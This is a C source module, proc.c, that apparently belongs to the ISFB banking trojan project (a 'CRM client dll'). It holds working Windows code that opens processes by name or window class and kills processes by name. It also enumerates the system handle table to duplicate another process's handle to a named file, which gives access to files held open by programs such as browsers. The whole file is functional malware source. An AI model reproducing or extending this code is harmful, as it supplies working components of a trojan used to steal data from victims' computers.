//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: proc.c
// $Revision: 191 $
// $Date: 2014-02-05 14:33:15 +0300 (Ср, 05 фев 2014) $
// description:
//	CRM client dll. Processes manipulation functions. 

#include "..\common\common.h"
#include <TlHelp32.h>
#include <malloc.h>

//////////////////////////////////////////////////////////////////////////
#define DUPLICATE_SAME_ATTRIBUTES   0x00000004

//////////////////////////////////////////////////////////////////////////
// opens process
HANDLE ProcOpenProcessByNameW( PWSTR ProcessName, DWORD dwDesiredAccess )
{
	HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
	HANDLE hProcess = NULL;
	PROCESSENTRY32W pe32;
	DWORD Error = ERROR_FILE_NOT_FOUND;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof( PROCESSENTRY32W );

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if( !Process32FirstW( hProcessSnap, &pe32 ) )
	{
		CloseHandle( hProcessSnap );          // clean the snapshot object
		return NULL;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do
	{
		if ( lstrcmpiW (pe32.szExeFile,ProcessName) == 0 )
		{
			if ( ( hProcess = OpenProcess( dwDesiredAccess, FALSE, pe32.th32ProcessID )) == NULL ){
				Error = GetLastError();
			}else{
				Error = NO_ERROR;
			}
			break;
		}
	} while( Process32NextW( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );

	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}
	return hProcess;
}

HANDLE ProcOpenProcessByNameA(
	LPSTR ProcessName, 
	DWORD dwDesiredAccess 
	)
{
	ULONG	Len = lstrlenA(ProcessName);
	LPWSTR	pNameW;
	HANDLE	hProcess = 0;

	if (pNameW = AppAlloc((Len + 1) * sizeof(WCHAR)))
	{
		mbstowcs(pNameW, ProcessName, Len + 1);
		hProcess = ProcOpenProcessByNameW(pNameW, dwDesiredAccess);
		AppFree(pNameW);
	}

	return(hProcess);
}

//
// terminates process by name
//
WINERROR ProcTerminateProcessW(
	LPWSTR ProcessName 
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE hProcess = ProcOpenProcessByNameW(ProcessName, PROCESS_TERMINATE);
	if (hProcess)
	{
		if (!TerminateProcess(hProcess,0))
			Status = GetLastError();
		CloseHandle(hProcess);
	}
	else
		Status = GetLastError();

	return Status;
}

WINERROR ProcTerminateProcessA(
	LPSTR ProcessName
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG	Len = lstrlenA(ProcessName);
	LPWSTR	pNameW;

	if (pNameW = AppAlloc((Len + 1) * sizeof(WCHAR)))
	{
		mbstowcs(pNameW, ProcessName, Len + 1);
		Status = ProcTerminateProcessW(pNameW);
		AppFree(pNameW);
	}

	return(Status);
}

//
// finds opened file in to the target process and duplicates file's handle
//
HANDLE ProcFileHandleFromProcess( HANDLE hProcess, LPWSTR FullFileName )
{
	DWORD ProcessID = GetProcessId( hProcess );
	PULONG Buffer;
	ULONG BufferSize  = 0x100000;
	PSYSTEM_HANDLE_INFORMATION HandleInfo;
	NTSTATUS ntStatus;
	ULONG i;

	PFILE_NAME_INFORMATION oni = NULL;
	POBJECT_TYPE_INFORMATION oti = NULL;
	OBJECT_BASIC_INFORMATION obi;
	UNICODE_STRING FileType;
	FILE_STANDARD_INFORMATION fsi;

	HANDLE hObject = NULL;
	ULONG ReturnedLength = 0;
	ULONG otiSize = 0;
	ULONG oniSize = 0;

	SIZE_T FullFileNameLen;

	// shift dir name
	// c:\dirname\dir2->\dirname\dir2
	FullFileName = FullFileName+2;
	FullFileNameLen = lstrlenW(FullFileName);

	Buffer = AppAlloc(BufferSize);
	if ( !Buffer ){
		return NULL;
	}

	while (NtQuerySystemInformation(SystemHandleInformation, Buffer, BufferSize, 0)== STATUS_INFO_LENGTH_MISMATCH){
		AppFree ( Buffer );
		BufferSize = BufferSize * 2;
		Buffer = AppAlloc(BufferSize);
		if ( !Buffer ){
			return NULL;
		}
	}

	HandleInfo = (PSYSTEM_HANDLE_INFORMATION)Buffer;

	for ( i = 0; i < HandleInfo->uCount; i++ ) {

		if ( HandleInfo->aSH[i].uIdProcess != ProcessID ){
			continue;
		}

		if ( !DuplicateHandle(
			hProcess, 
			(HANDLE)HandleInfo->aSH[i].Handle, 
			GetCurrentProcess(), 
			&hObject,
			0 ,FALSE, DUPLICATE_SAME_ACCESS
			))
		{
			continue;
		}

		ntStatus = NtQueryObject(hObject, ObjectBasicInformation, &obi, sizeof obi, &ReturnedLength);
		if ( !NT_SUCCESS(ntStatus)) {
			CloseHandle( hObject );
			continue;
		}

		// reallocate buffers if needed
		if ( otiSize < obi.TypeInformationLength + 2 ){
			if ( oti ){
				AppFree( oti );
			}
			otiSize = obi.TypeInformationLength + 2;
			oti = AppAlloc( otiSize );
			if ( !oti ) {
				otiSize = 0;
				CloseHandle( hObject );
				continue;
			}
		}

		if ( obi.NameInformationLength == 0 ){
			obi.NameInformationLength = (MAX_PATH + 1 )* sizeof (WCHAR);
		}

		if ( oniSize < obi.NameInformationLength + 2 ){
			if ( oni ){
				AppFree( oni );
			}
			oniSize = (obi.NameInformationLength == 0 ) ? MAX_PATH * sizeof (WCHAR): obi.NameInformationLength + 2;
			oni = AppAlloc( oniSize );
			if ( !oni ) {
				oniSize = 0;
				CloseHandle( hObject );
				continue;
			}
		}

		ntStatus = 
			NtQueryObject(
				hObject, 
				ObjectTypeInformation, 
				oti, 
				otiSize, 
				&ReturnedLength
				);

		if ( NT_SUCCESS(ntStatus)) {
			RtlInitUnicodeString(&FileType,L"File");

			if ( RtlEqualUnicodeString(&FileType,&oti->Name,TRUE) )
			{
				IO_STATUS_BLOCK IoStatus;

				ntStatus = 
					NtQueryInformationFile( 
						hObject, 
						&IoStatus, 
						&fsi,sizeof(fsi), 
						FileStandardInformation 
						);

				if ( NT_SUCCESS(ntStatus) && !fsi.Directory && !fsi.DeletePending) {

					ntStatus = 
						NtQueryInformationFile( 
							hObject, 
							&IoStatus, 
							oni,oniSize, 
							FileNameInformation
							);

					if ( NT_SUCCESS(ntStatus))
					{
						if ( oni->FileNameLength/sizeof(WCHAR) >= FullFileNameLen )
						{
							oni->FileName[oni->FileNameLength/sizeof(WCHAR)] = 0;
							if ( _wcsicmp(FullFileName,oni->FileName) == 0 )
							{
								// WE FIND A FILE!!!
								break;
							}
						}
					}
				}
			}
		}
		if ( hObject ){
			CloseHandle(hObject);
		}
	}
	if ( oti ){
		AppFree ( oti );
	}
	if ( oni ){
		AppFree ( oni );
	}
	if ( Buffer ){
		AppFree ( Buffer );
	}
	return hObject;
}

HANDLE ProcOpenProcessByWindow( LPWSTR WindowClass, DWORD Access )
{
	DWORD ProcessID;
	HANDLE hProcess = NULL;
	HWND hWnd = FindWindowW(WindowClass,NULL);
	if ( hWnd )
	{
		if ( GetWindowThreadProcessId( hWnd, &ProcessID ) )
		{
			hProcess = OpenProcess(Access,FALSE,ProcessID);
		}
	}
	return hProcess;
}